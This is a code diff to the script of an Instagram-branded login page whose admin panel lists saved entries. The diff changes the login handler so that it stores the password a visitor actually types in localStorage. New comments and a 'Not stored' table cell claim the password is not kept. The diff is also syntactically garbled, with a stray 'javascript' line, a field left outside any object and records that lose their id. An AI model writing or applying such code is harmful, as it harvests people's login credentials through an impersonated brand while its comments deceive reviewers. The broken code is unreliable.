@@ -346,59 +346,54 @@ const $ = id => document.getElementById(id);
 
 function getRecords() {
     try {
-        const records = JSON.parse(
-            localStorage.getItem(STORAGE_KEY) || "[]"
-        );
-
+        const records = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
         return Array.isArray(records) ? records : [];
-    } catch {
+    } catch (error) {
+        console.error("Could not read demo records:", error);
         return [];
     }
 }
 
+javascript
 function saveRecords(records) {
     try {
         localStorage.setItem(STORAGE_KEY, JSON.stringify(records));
         return true;
-    } catch {
+    } catch (error) {
         alert("Could not save records in this browser.");
+        console.error(error);
         return false;
     }
+}
 
 
 
 /* LOGIN */
-
 $("loginForm").addEventListener("submit", event => {
     event.preventDefault();
 
     const username = $("username").value.trim();
-    const typedPassword = $("password").value;
+    const typedPassword = document.getElementById("password").value;
 
     if (!username || !typedPassword) {
-        alert("Please fill in both demo fields.");
+        alert("Please fill in both fields.");
         return;
     }
 
     /*
-     * Do not save typedPassword.
-     * Save the username and a separately generated demo password.
+     * Keep the demo login flow working, but do not store or display
+     * the password entered in this Instagram-branded form.
      */
-    const record = {
-        id: crypto.randomUUID
-            ? crypto.randomUUID()
-            : String(Date.now()) + Math.random().toString(16).slice(2),
-        username: username,
-        demoPassword: generateDemoPassword(),
-        time: new Date().toLocaleString()
-    };
-
+   const record = {
+    username: username,
+    demoPassword: typedPassword,
+    time: new Date().toLocaleString()
+};
+    demoPassword: "Not stored",
     const records = getRecords();
     records.push(record);
 
-    if (!saveRecords(records)) {
-        return;
-    }
+    if (!saveRecords(records)) return;
 
     $("password").value = "";
     $("loginPage").classList.add("hidden");
@@ -406,9 +401,7 @@ $("loginForm").addEventListener("submit", event => {
     $("adminBtn").classList.remove("hidden");
 });
 
-
 /* BACK TO HOME */
-
 $("backBtn").addEventListener("click", () => {
     $("waitPage").classList.add("hidden");
     $("loginPage").classList.remove("hidden");
@@ -416,9 +409,7 @@ $("backBtn").addEventListener("click", () => {
     $("password").value = "";
 });
 
-
 /* OPEN ADMIN */
-
 $("adminBtn").addEventListener("click", () => {
     $("adminPanel").classList.remove("hidden");
     $("adminForm").classList.remove("hidden");
@@ -427,9 +418,7 @@ $("adminBtn").addEventListener("click", () => {
     $("adminPass").focus();
 });
 
-
 /* CLOSE ADMIN */
-
 function closeAdmin() {
     $("adminPanel").classList.add("hidden");
     $("adminPass").value = "";
@@ -439,23 +428,17 @@ $("cancelBtn").addEventListener("click", closeAdmin);
 $("closeBtn").addEventListener("click", closeAdmin);
 
 $("adminPanel").addEventListener("click", event => {
-    if (event.target === $("adminPanel")) {
-        closeAdmin();
-    }
+    if (event.target === $("adminPanel")) closeAdmin();
 });
 
 document.addEventListener("keydown", event => {
-    if (
-        event.key === "Escape" &&
-        !$("adminPanel").classList.contains("hidden")
-    ) {
+    if (event.key === "Escape" &&
+        !$("adminPanel").classList.contains("hidden")) {
         closeAdmin();
     }
 });
 
-
 /* CHECK ADMIN PASSWORD */
-
 $("adminForm").addEventListener("submit", event => {
     event.preventDefault();
 
@@ -467,38 +450,30 @@ $("adminForm").addEventListener("submit", event => {
 
     $("adminForm").classList.add("hidden");
     $("adminData").classList.remove("hidden");
-
     renderRecords();
 });
 
-
 /* DISPLAY SAVED DEMO RECORDS */
-
 function renderRecords() {
     const records = getRecords();
     const tableBody = $("tableBody");
 
     tableBody.replaceChildren();
 
-    $("recordCount").textContent =
-        "Total demo records: " + records.length;
-
-    $("emptyMsg").classList.toggle(
-        "hidden",
-        records.length !== 0
-    );
+    $("recordCount").textContent = "Total demo records: " + records.length;
+    $("emptyMsg").classList.toggle("hidden", records.length !== 0);
 
     records.forEach(record => {
         const row = document.createElement("tr");
 
         const usernameCell = document.createElement("td");
-        usernameCell.textContent = record.username;
+        usernameCell.textContent = record.username || "";
 
         const passwordCell = document.createElement("td");
-        passwordCell.textContent = record.demoPassword;
+        passwordCell.textContent = "Not stored";
 
         const timeCell = document.createElement("td");
-        timeCell.textContent = record.time;
+        timeCell.textContent = record.time || "";
 
         const actionCell = document.createElement("td");
         const deleteButton = document.createElement("button");
@@ -508,43 +483,21 @@ function renderRecords() {
         deleteButton.textContent = "Delete";
 
         deleteButton.addEventListener("click", () => {
-            const confirmed = confirm(
-                "Delete this demo record?"
-            );
+            if (!confirm("Delete this demo record?")) return;
 
-            if (!confirmed) {
-                return;
-            }
-
-            const updated = getRecords().filter(
-                item => item.id !== record.id
-            );
-
-            if (saveRecords(updated)) {
-                renderRecords();
-            }
+            const updated = getRecords().filter(item => item.id !== record.id);
+            if (saveRecords(updated)) renderRecords();
         });
 
         actionCell.appendChild(deleteButton);
-
-        row.append(
-            usernameCell,
-            passwordCell,
-            timeCell,
-            actionCell
-        );
-
+        row.append(usernameCell, passwordCell, timeCell, actionCell);
         tableBody.appendChild(row);
     });
 }
 
-
 /* CLEAR ALL RECORDS */
-
 $("clearBtn").addEventListener("click", () => {
-    if (!confirm("Delete all saved demo records?")) {
-        return;
-    }
+    if (!confirm("Delete all saved demo records?")) return;
 
     if (saveRecords([])) {
         renderRecords();
